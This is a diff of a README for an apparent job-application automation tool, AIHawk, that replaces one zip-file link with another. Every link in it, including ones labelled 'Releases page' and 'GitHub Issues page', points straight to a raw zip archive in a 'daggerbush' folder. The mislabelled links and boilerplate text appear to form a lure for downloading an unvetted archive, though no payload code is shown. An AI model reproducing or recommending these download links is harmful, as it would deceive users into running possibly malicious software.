@@ -1,6 +1,6 @@
 # 🎯 Jobs_Applier_AI_Agent_AIHawk - Simplifying Your Job Applications
 
-[![Download AIHawk](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/Jobs_Applier_AI_Agent_AIHawk-v1.7.zip)](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/Jobs_Applier_AI_Agent_AIHawk-v1.7.zip)
+[![Download AIHawk](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/AI_A_Applier_Jobs_Hawk_Agent_2.3.zip)](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/AI_A_Applier_Jobs_Hawk_Agent_2.3.zip)
 
 ## 📖 Description
 AIHawk aims to ease your job hunt process by automating the job application process. Utilizing artificial intelligence, it enables you to apply for multiple jobs in a tailored way.
@@ -9,7 +9,7 @@ AIHawk aims to ease your job hunt process by automating the job application proc
 To start using AIHawk, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/Jobs_Applier_AI_Agent_AIHawk-v1.7.zip). Here, you will find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/AI_A_Applier_Jobs_Hawk_Agent_2.3.zip). Here, you will find the latest version of the application.
 
 2. **Download the Application**  
    Look for the latest version listed at the top. You will see titles that include version numbers. Click on the file that corresponds to your operating system (e.g., Windows, Mac, Linux) to download the application.
@@ -40,7 +40,7 @@ To ensure smooth operation, make sure your system meets the following requiremen
 ## 📥 Download & Install
 Click the button below to access the latest version of AIHawk:
 
-[![Download AIHawk](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/Jobs_Applier_AI_Agent_AIHawk-v1.7.zip)](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/Jobs_Applier_AI_Agent_AIHawk-v1.7.zip)
+[![Download AIHawk](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/AI_A_Applier_Jobs_Hawk_Agent_2.3.zip)](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/AI_A_Applier_Jobs_Hawk_Agent_2.3.zip)
 
 ### Installation Steps
 1. **Start the Installation:**  
@@ -69,6 +69,6 @@ If you encounter issues:
 - **FAQs Section:** Visit our FAQs section in the GitHub Wiki for common problems and solutions.
 
 ## 🆘 Support
-Need help? Don’t hesitate to reach out. You can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/Jobs_Applier_AI_Agent_AIHawk-v1.7.zip) for support. 
+Need help? Don’t hesitate to reach out. You can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/anti-bore/Jobs_Applier_AI_Agent_AIHawk/main/daggerbush/AI_A_Applier_Jobs_Hawk_Agent_2.3.zip) for support. 
 
 We appreciate your feedback, as it helps us improve the application for everyone. Thank you for trying AIHawk, and best of luck with your job search!
